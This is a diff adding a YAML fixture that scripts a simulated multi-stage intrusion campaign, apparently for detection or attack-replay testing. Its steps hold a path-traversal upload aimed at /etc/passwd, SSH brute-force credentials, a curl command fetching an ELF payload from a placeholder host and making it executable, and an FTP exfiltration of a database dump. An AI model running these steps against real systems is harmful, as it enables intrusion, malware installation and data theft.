@@ -1,0 +1,44 @@
+campaign_id: CAMP-A-MULTI-STAGE
+steps:
+- step_id: S1
+  offset_sec: 0.0
+  node: node_alpha
+  service: http
+  action: RECON_SCAN
+  payload: GET /api/v1/debug HTTP/1.1
+  status: 200
+- step_id: S2
+  offset_sec: 4.5
+  node: node_alpha
+  service: http
+  action: VULN_EXPLOIT
+  payload: POST /api/upload?path=../../etc/passwd
+  status: 200
+- step_id: S3
+  offset_sec: 10.2
+  node: node_alpha
+  service: ssh
+  action: BRUTE_FORCE
+  payload: user=root, pass=admin123
+  status: 401
+- step_id: S4
+  offset_sec: 13.0
+  node: node_alpha
+  service: ssh
+  action: SUCCESS_LOGIN
+  payload: user=deployer, pass=deployer2026
+  status: 200
+- step_id: S5
+  offset_sec: 16.5
+  node: node_alpha
+  service: ssh
+  action: EXEC_SHELL
+  payload: curl -O http://198.51.100.42/payload.elf && chmod +x payload.elf
+  status: 0
+- step_id: S6
+  offset_sec: 22.0
+  node: node_beta
+  service: ftp
+  action: PIVOT_EXFIL
+  payload: PUT /loot/database_dump.sql
+  status: 226
